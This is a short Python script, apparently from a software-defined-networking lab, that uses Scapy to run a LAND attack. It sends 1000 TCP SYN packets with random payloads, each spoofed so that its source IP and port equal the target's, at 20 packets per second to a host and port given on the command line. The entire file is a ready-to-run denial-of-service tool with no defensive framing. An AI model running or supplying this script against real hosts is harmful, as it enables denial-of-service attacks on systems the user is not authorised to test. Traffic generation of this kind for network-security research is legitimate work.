#   python -E LAND.py target_ip target_port
"""
LAND attack to destination ip and port.
LAND attack to host within the network, not to controller or switch, with neither table-miss event nor packet-in messages.
Send 1000 packets with the rate of 20 packets per second.
"""

import sys
import time
from os import popen
from scapy.all import sendp, IP, Ether, TCP
import random
import string
from random import randint


def main():
    dstIP = sys.argv[1]
    dst_port = sys.argv[2]
    print (dst_port)
    print (dstIP)

    interface = popen('ip link show | grep "eth0:" | awk \'{print $2}\' | tr -d ":"').read()
    if not interface.strip():
        interface = popen('ifconfig | grep "eth0" | awk \'{print $1}\'').read()
    print(repr(interface))

    payload = ""

    for i in range(1000):
        payload = "".join(random.choice(string.ascii_uppercase + string.digits +
                          string.ascii_lowercase) for x in range(randint(10, 40)))

        packets = Ether() / IP(dst=dstIP, src=dstIP) / TCP(dport=int(dst_port), sport=int(dst_port),
                                                           flags="S") / payload

        print(repr(packets))
        sendp(packets, iface=interface.rstrip(), inter=0.05)


if __name__ == "__main__":
    main()
